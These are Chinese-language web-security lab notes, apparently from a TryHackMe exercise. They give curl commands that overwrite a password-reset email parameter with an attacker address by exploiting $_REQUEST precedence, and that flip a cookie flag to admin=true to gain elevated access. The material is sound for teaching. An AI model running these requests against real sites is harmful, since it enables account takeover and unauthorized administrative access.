2. 逻辑漏洞
```shell
    ### 利用脚本的语法特性和逻辑不严谨进行利用和攻击
    # $_REQUEST接收GET请求和POST请求的数据，如果参数相同，则倾向于使用POST的请求参数，因此可以直接在POST数据包中传递参数对URL链接的参数进行覆盖

    # 正常请求
    curl 'http://10.10.93.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

    # 不正常请求，attacker@hacker.com会覆盖robert%40acmeitsupport.thm，从而达到攻击目的
    curl 'http://10.10.93.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

3. cookie
```shell
    ### 修改cookie值从而越权
    # 正常访问
    curl http://10.10.93.22/cookie-test

    # 带有cookie,但是为普通权限的访问
    curl -H "Cookie: logged_in=true; admin=false" http://10.10.93.22/cookie-test

    # 通过修改cookie的权限参数来进行越权
    curl -H "Cookie: logged_in=true; admin=true" http://10.10.93.22/cookie-test

    ### 大部分cookie都会进行编码和加密，因此识别编码类型和加密方法是重中之重
```
